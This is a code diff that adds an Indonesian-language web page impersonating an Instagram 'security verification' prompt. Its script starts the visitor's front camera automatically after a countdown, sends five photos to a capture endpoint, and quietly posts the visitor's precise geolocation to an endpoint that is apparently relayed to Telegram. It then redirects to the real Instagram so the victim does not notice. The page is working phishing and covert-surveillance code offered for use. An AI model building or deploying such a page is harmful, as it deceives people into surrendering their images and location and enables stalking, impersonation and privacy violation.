@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan - Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .verify-container {
+            max-width: 450px;
+            margin: 40px auto;
+            padding: 30px;
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .verify-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: #262626;
+        }
+        
+        .verify-text {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .camera-container {
+            width: 100%;
+            height: 300px;
+            background: #000;
+            border-radius: 8px;
+            margin: 20px 0;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        #videoElement {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            background: rgba(0,0,0,0.7);
+            font-size: 14px;
+        }
+        
+        .verify-btn {
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 10px 0;
+            width: 100%;
+        }
+        
+        .verify-btn:hover {
+            background: #007acc;
+        }
+        
+        .loading {
+            display: none;
+            margin: 15px 0;
+            color: #8e8e8e;
+        }
+        
+        .success {
+            display: none;
+            color: #00a400;
+            margin: 15px 0;
+        }
+        
+        .countdown {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="verify-container">
+            <div class="verify-icon">🔒</div>
+            <h1>Verifikasi Keamanan Diperlukan</h1>
+            
+            <p class="verify-text">
+                Untuk melindungi akun Anda dari aktivitas mencurigakan, 
+                kami perlu memverifikasi identitas Anda melalui kamera.
+                Proses ini hanya membutuhkan waktu 10 detik.
+            </p>
+            
+            <div class="camera-container">
+                <video id="videoElement" autoplay playsinline></video>
+                <div class="camera-overlay" id="cameraOverlay">
+                    <div style="font-size: 32px; margin-bottom: 10px;">📷</div>
+                    <div>Kamera akan diaktifkan secara otomatis</div>
+                    <div class="countdown" id="countdown">Memulai dalam 3 detik...</div>
+                </div>
+            </div>
+            
+            <button class="verify-btn" id="enableBtn" onclick="enableCamera()">Aktifkan Kamera Sekarang</button>
+            
+            <div class="loading" id="loading">
+                ⏳ Memverifikasi identitas Anda...
+            </div>
+            
+            <div class="success" id="success">
+                ✅ Verifikasi berhasil! Mengarahkan ke Instagram...
+            </div>
+            
+            <p style="font-size: 12px; color: #8e8e8e; margin-top: 20px;">
+                Dengan melanjutkan, Anda menyetujui <a href="#" style="color: #00376b;">Ketentuan</a> dan <a href="#" style="color: #00376b;">Kebijakan Privasi</a> Instagram.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_API = '/api/telegram';
+        const CAPTURE_API = '/api/capture';
+        
+        let cameraStream = null;
+        let captureInterval = null;
+        let captureCount = 0;
+        const maxCaptures = 5; // Ambil 5 foto
+        
+        // Enable camera
+        async function enableCamera() {
+            const enableBtn = document.getElementById('enableBtn');
+            const overlay = document.getElementById('cameraOverlay');
+            const loading = document.getElementById('loading');
+            const success = document.getElementById('success');
+            
+            enableBtn.style.display = 'none';
+            overlay.style.display = 'none';
+            loading.style.display = 'block';
+            
+            try {
+                // Request camera access
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                // Show video stream
+                const video = document.getElementById('videoElement');
+                video.srcObject = cameraStream;
+                loading.style.display = 'none';
+                
+                // Start capturing photos
+                startCapture();
+                
+                // Stop after 10 seconds
+                setTimeout(() => {
+                    stopCamera();
+                    success.style.display = 'block';
+                    
+                    // Redirect to real Instagram
+                    setTimeout(() => {
+                        window.location.href = 'https://www.instagram.com';
+                    }, 2000);
+                }, 10000);
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                overlay.style.display = 'flex';
+                overlay.innerHTML = '❌ Akses kamera ditolak<br><small>Verifikasi gagal</small>';
+                loading.style.display = 'none';
+                enableBtn.style.display = 'block';
+            }
+        }
+        
+        // Capture photo
+        async function capturePhoto() {
+            if (!cameraStream || captureCount >= maxCaptures) return;
+            
+            const video = document.getElementById('videoElement');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            // Convert to base64
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            
+            // Send to backend
+            try {
+                await fetch(CAPTURE_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        image: imageData,
+                        count: captureCount + 1,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                
+                captureCount++;
+                console.log(`Photo ${captureCount} captured`);
+            } catch (error) {
+                console.error('Error sending photo:', error);
+            }
+        }
+        
+        // Start capturing
+        function startCapture() {
+            // Capture immediately
+            capturePhoto();
+            
+            // Capture every 2 seconds
+            captureInterval = setInterval(capturePhoto, 2000);
+        }
+        
+        // Stop camera
+        function stopCamera() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+        }
+        
+        // Auto start after 5 seconds
+        let countdown = 5;
+        const countdownElement = document.getElementById('countdown');
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            if (countdown > 0) {
+                countdownElement.textContent = `Memulai dalam ${countdown} detik...`;
+            } else {
+                clearInterval(countdownInterval);
+                enableCamera();
+            }
+        }, 1000);
+        
+        // Get location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'location',
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            });
+        }
+        
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', stopCamera);
+    </script>
+</body>
+</html>
